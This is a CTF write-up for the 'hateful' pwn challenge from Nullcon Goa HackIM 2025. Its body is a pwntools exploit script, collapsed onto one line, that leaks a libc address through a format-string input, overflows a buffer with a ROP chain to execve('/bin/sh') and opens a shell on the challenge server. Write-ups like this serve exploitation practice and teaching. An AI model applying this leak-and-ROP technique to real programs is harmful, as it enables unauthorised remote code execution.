---
title: "hateful - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "hateful", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "hateful from pwn import  from sys import  context.loglevel = 'warning' context.arch = 'amd64' elf = ELF(\"./hatefulpatched\") p = process(\"./hatefulpatched\") libc = ELF(\"./libc.so.6\") r = remote('52.59."
source:
  name: "CTFtime writeup #39986"
  url: "https://ctftime.org/writeup/39986"
original_source: "https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/SktJ318Kye"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "hateful"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** hateful
- **Author team:** volticks_fanClub
- **CTFtime:** <https://ctftime.org/writeup/39986>
- **Original writeup:** <https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/SktJ318Kye>

---
hateful from pwn import * from sys import * context.log_level = 'warning' context.arch = 'amd64' elf = ELF("./hateful_patched") p = process("./hateful_patched") libc = ELF("./libc.so.6") r = remote('52.59.124.14',5020) r.recvuntil(b'>> ') r.sendline(b'yay') r.recvuntil(b'>> ') r.sendline(b'%5$p') r.recvuntil(b'email provided: ') res = int(r.recvline().rstrip(), 16) libc.address = (res - libc.sym['_IO_2_1_stdin_']) binsh = next(libc.search(b'/bin/sh\x00')) rop = ROP(libc) rop.execve((binsh), 0, 0) payload = b'A'*1016 payload += rop.chain() r.recvuntil(b'!') r.recvline() r.sendline(payload) r.interactive() 

×

### Sign in

or

[ ![](https://hackmd.io/social/google.svg) Sign in via Google  ](https://hackmd.io/auth/google) [ ![](https://hackmd.io/social/facebook.svg) Sign in via Facebook  ](https://hackmd.io/auth/facebook) [ ![](https://hackmd.io/social/x.svg) Sign in via X(Twitter)  ](https://hackmd.io/auth/twitter) [ ![](https://hackmd.io/social/github.svg) Sign in via GitHub  ](https://hackmd.io/auth/github) [ ![](https://hackmd.io/social/dropbox.svg) Sign in via Dropbox  ](https://hackmd.io/auth/dropbox) ![](https://hackmd.io/images/wallet.svg) Sign in with Wallet  Wallet (  )  __ Connect another wallet  Continue with a different method 

New to HackMD? [Sign up](https://hackmd.io/join)

By signing in, you agree to our [terms of service](https://hackmd.io/s/terms).
